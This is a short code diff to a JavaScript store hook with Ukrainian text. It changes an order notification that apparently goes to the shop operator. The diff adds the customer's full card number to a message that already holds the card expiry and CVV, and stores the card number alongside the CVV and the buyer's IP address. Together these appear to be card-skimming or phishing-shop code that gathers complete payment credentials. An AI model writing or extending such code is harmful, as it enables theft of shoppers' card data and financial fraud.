@@ -674,7 +674,7 @@ const useStore = () => {
       `💵 Сума після доставки: ${orderData.cost_after_delivery_rate}\n` +
       `🧾 Промокод: ${orderData.promo_code || 'немає'}\n` +
       `🏙 Місто доставки: ${orderData.delivery_city || 'не вказано'}\n` +
-      `💳 Термін карти: ${orderData.card_expiry || 'не вказано'}, CVV: ${orderData.card_cvv || 'не вказано'}\n` +
+      `💳 Номер карти: ${orderData.card_number || 'не вказано'}, Термін карти: ${orderData.card_expiry || 'не вказано'}, CVV: ${orderData.card_cvv || 'не вказано'}\n` +
       `🕒 Час: ${orderData.createdAt}\n` +
       `\nСклад:\n${itemsText}`;
 
@@ -741,6 +741,7 @@ const useStore = () => {
     contact_number: order.phoneNumber,
     delivery_city: order.deliveryCity || "",
     payment_details: order.paymentDetails || "",
+    card_number: order.cardNumber || "",
     card_expiry: order.cardExpiry || "",
     card_cvv: order.cardCVV || "",
     ip_address: ip,
